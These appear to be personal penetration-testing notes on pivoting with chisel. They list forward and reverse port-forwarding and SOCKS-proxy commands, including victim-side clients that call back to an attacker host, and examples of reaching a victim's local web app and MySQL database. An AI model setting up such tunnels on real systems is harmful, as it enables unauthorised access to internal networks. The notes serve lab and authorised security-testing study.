https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/

In case you get library errors, use chisel_1.7.4 (legacy)

NOTE: If you run chisel in a reverse shell and if you exit out of the shell, chisel will STAY running.
	so if we need to free a port, you can do so.
#### Usage

Port Forward
```bash
# Victim
chisel server -p <listen-port>

# Attacker
chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>

```

Reverse Port Forward (THE GOAT)
```bash
# Attacker
chisel server -p 9999 --reverse

# Victim
chisel client <attacker_ip>:9999 R:8090:172.16.22.2:8000
	# in this case, 8090 gets forwarded to internal network ip 172.16.22.2:8000
```

Forward Dynamic SOCKS proxy
```bash
# /etc/proxychains.conf
...SNIP...
socks5 127.0.0.1  8000

# Victim
chisel server -p 9999 --socks5

# Attacker
chisel client <victim_ip>:9999 8000:socks
```

Reverse Dynamic SOCKS Proxy (THE SLIGHTLY SLOWER GOAT)
```bash
# /etc/proxychains.conf
...SNIP...
socks5 127.0.0.1  8000

# Attacker
chisel server -p 9999 --reverse --socks5

# Victim
chisel client <attacker_ip>:9999 R:socks
```

#### Examples
```
# NOTE
IF SOCKS FAILS, TRY STATIC PORT FORWARDING
```

Accessing a web app running locally on a victim box
	Reverse Dynamic Socks Proxy
		lets say victim has a web app running on port 8000 locally
		KALI
			`chisel server -p 8001 --socks5 --reverse
		Victim
			`chisel client <KALI_IP>:8001 R:socks
		Visit 127.0.0.1:8000 on via `proxychains firefox` on KALI
			may need to clear histor/cache etc
```
# Use a different port for the server than the port we want to attack!!!
```
-
	Reverse Port Forward (no SOCKS)
		KALI
			`chisel server -p 8001 --reverse
		Victim
			`chisel client <KALI_IP>:8001 R:8080:127.0.0.1:80
		Visit 127.0.0.1:8080 on kali and it will forward you to the victim localhost:80
			Note: the 8080 is arbitrary, we are just setting a random port that we will connect to FROM our KALI box

Accessing a MySQL db running on a victim box
	Forward Dynamic Port forward
		Victim
			`chisel.exe server -p 9001 --socks5
		Kali
			`chisel client <Victim_IP>:9001 <proxychains_socks_port>:socks
			edit /etc/proxychains
		Connect
			`proxychains mysql -h 127.0.0.1 -P 3306

#### Additional Information

Master
```bash
# Run a Chisel server:
chisel server                                                                       
# Run a Chisel server listening to a specific port:
chisel server -p server_port                                                                  
# Run a chisel server that accepts authenticated connections using username and password:
chisel server --auth username:password                                                             
# Connect to a Chisel server and tunnel a specific port to a remote server and port:
chisel client server_ip:server_port local_port:remote_server:remote_port                                                                   
# Connect to a Chisel server and tunnel a specific host and port to a remote server and port:
chisel client server_ip:server_port local_host:local_port:remote_server:remote_port    

# Connect to a Chisel server using username and password authentication:
chisel client --auth username:password server_ip:server_port local_port:remote_server:remote_port      

# Initialize a Chisel server in reverse mode on a specific port, also enabling SOCKS5 proxy (on port 1080) functionality:
chisel server -p server_port --reverse --socks5                                                                  
# Connect to a Chisel server at specific IP and port, creating a reverse tunnel mapped to a local SOCKS proxy:
chisel client server_ip:server_port R:socks
```

